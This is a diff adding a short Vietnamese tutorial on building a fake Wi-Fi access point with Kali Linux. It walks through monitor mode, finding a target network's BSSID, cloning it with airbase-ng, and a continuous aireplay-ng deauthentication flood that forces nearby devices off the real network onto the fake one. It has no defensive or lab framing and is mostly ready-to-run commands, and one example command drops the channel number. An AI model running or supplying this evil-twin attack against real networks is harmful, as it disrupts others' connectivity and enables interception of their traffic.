@@ -1,0 +1,21 @@
+                                        ---CÁCH TẠO WIFI FAKE WITH KALI_LINUX---
+Bước 1: Vào terminal trên kali-linux
+  ** Nếu bạn chạy với quyền quản trị viên root thì bỏ chữ sudo nếu chạy bình thường thì phải có sudo trước lệnh ** 
+  ** Chạy lệnh sudo apt-get update **
+Bước 2: Kiểm tra card wifi
+   sudo ifconfig
+
+Bước 3: Vào chế độ amitor
+   sudo airmon-ng start wlan0
+
+Bước 4: Tìm địa chỉ BSSID của wifi muốn fake
+   sudo airodump-ng wlan0mon
+
+Bước 5: Tạo wifi ảo
+   sudo airbase-ng -a {BSSID} -e "{tên wifi}" -c 6 wlan0mon
+     vd:  airbase-ng -a 88:5D:FB:FA:77:72 -e "Ha Anh 1" -c wlan0mon 
+
+Bước 6: Mở 1 tab terminal khác để chay lệnh ngắt kết nối các thiết bị khác tới mạng wifi cũ và bắt phải kết nối vào wifi fake
+   sudo aireplay-ng -0 0 -a {BSSID} wlan0mon
+     vd: aireplay-ng -0 0 -a 88:5D:FB:FA:77:72 wlan0mon 
+** Chú ý: Để tắt wifi ảo nhấn "ctrl+c"  **
